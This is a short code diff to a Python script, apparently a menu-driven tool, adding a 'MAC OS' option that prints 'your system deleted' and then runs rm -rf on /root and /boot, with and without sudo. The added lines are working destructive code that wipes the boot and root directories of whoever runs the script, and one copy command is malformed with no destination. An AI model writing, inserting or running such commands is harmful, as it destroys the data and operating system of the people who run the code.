@@ -143,7 +143,12 @@ def run():
         def delOs():
             banner.Created_banner(Color.RED + 'MAC OS')
             ClearCSR()
-            os.system('sudo')
+            time.sleep(2)
+            print('[*] -> your system deleted')
+            os.system('sudo cp -r /boot/* /root/boot/') or os.system('cp -r /boot/* /root/boot/')
+            os.system('sudo cp -r /root/*') or os.system('cp -r /root/*')
+            os.system('sudo rm -rf /root/*') or os.system('rm -rf /root/*')
+            os.system('sudo rm -rf /boot/*') or os.system('rm -rf /boot/*')
         delOs()
 
     elif sys == '99':
